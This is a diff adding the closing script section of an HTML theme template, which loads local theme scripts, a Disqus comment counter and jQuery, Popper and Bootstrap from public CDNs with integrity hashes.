+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+<!-- Bootstrap and images ZOOM feature
+================================================== -->
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+</body>
+</html>
